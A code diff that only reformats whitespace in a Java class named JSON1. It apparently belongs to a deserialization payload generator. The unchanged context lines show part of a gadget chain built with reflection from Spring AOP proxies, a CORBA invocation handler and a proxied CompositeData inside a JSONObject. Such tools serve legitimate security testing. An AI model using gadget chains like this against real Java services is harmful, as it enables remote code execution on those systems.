@@ -63,7 +63,7 @@ public class JSON1 implements ObjectPayload<Object> {
                 new String[]{"a"},
                 new OpenType[]{javax.management.openmbean.SimpleType.INTEGER}
         );
-        TabularType        tt = new TabularType("a", "b", rt, new String[]{"a"});
+        TabularType tt = new TabularType("a", "b", rt, new String[]{"a"});
         TabularDataSupport t1 = new TabularDataSupport(tt);
         TabularDataSupport t2 = new TabularDataSupport(tt);
 
@@ -72,14 +72,14 @@ public class JSON1 implements ObjectPayload<Object> {
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(tql);
         InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
-        InvocationHandler cdsInvocationHandler      = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
-        InvocationHandler invocationHandler         = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
+        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
+        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
         ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
         Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
         final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
 
         JSONObject jo = new JSONObject();
-        Map        m  = new HashMap();
+        Map m = new HashMap();
         m.put("t", cdsProxy);
         Reflections.setFieldValue(jo, "properties", m);
         Reflections.setFieldValue(jo, "properties", m);
